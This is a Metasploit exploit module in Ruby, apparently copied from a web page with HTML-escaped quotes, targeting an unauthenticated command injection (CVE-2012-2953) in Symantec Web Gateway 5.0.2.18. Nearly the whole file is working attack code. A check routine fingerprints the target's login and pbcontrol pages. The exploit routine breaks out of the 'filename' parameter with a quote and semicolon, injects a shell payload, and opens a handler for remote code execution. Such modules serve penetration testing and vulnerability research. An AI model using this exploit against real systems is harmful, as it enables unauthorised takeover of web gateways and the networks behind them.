# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "Symantec Web Gateway 5.0.2.18 pbcontrol.php Command Injection",
            &#039;Description&#039;    => %q{
                    This module exploits a command injection vulnerability found in Symantec Web
                Gateway&#039;s HTTP service.  While handling the filename parameter, the Spywall API
                does not do any filtering before passing it to an exec() call in proxy_file(),
                thus results in remote code execution under the context of the web server. Please
                note authentication is NOT needed to gain access.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;muts&#039;,  # Original discovery
                    &#039;sinn3r&#039; # Metasploit
                ],
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2012-2953&#039; ],
                    [ &#039;BID&#039;, &#039;54426&#039; ],
                    [ &#039;EDB&#039;, &#039;20088&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2012&suid=20120720_00&#039;]
                ],
            &#039;Payload&#039;        =>
                {
                    #&#039;BadChars&#039; => "\x00\x0d\x0a",
                    &#039;Compat&#039;      =>
                        {
                            &#039;PayloadType&#039; => &#039;cmd&#039;,
                            &#039;RequiredCmd&#039; => &#039;generic perl bash telnet&#039;
                        }
                },
            &#039;Platform&#039;       => [&#039;unix&#039;],
            &#039;Arch&#039;           => ARCH_CMD,
            &#039;Targets&#039;        =>
                [
                    [&#039;Symantec Web Gateway 5.0.2.18&#039;, {}]
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => "Jul 23 2012",
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                OptString.new(&#039;TARGETURI&#039;, [true, &#039;The URI path to pbcontrol&#039;, &#039;/spywall/pbcontrol.php&#039;])
            ], self.class)
    end
 
 
    def check
        dir = File.dirname(target_uri.path)
 
        res1 = send_request_raw({&#039;uri&#039; => "#{dir}/login.php"})
        res2 = send_request_raw({&#039;uri&#039; => "#{dir}/pbcontrol.php"})
 
        if res1 and res2
            if res1.body =~ /\<title\>Symantec Web Gateway\<\/title\>/ and res2.body =~ /^0$/
                return Exploit::CheckCode::Detected
            end
        end
 
        return Exploit::CheckCode::Safe
    end
 
 
    def exploit
        send_request_cgi({
            &#039;uri&#039;      => target_uri.path,
            &#039;method&#039;   => &#039;GET&#039;,
            &#039;vars_get&#039; => {
                &#039;filename&#039; => "#{Rex::Text.rand_text_alpha(4)}\";#{payload.encoded};\"",
                &#039;stage&#039; => &#039;0&#039;
            }
        })
 
        handler
    end
 
end



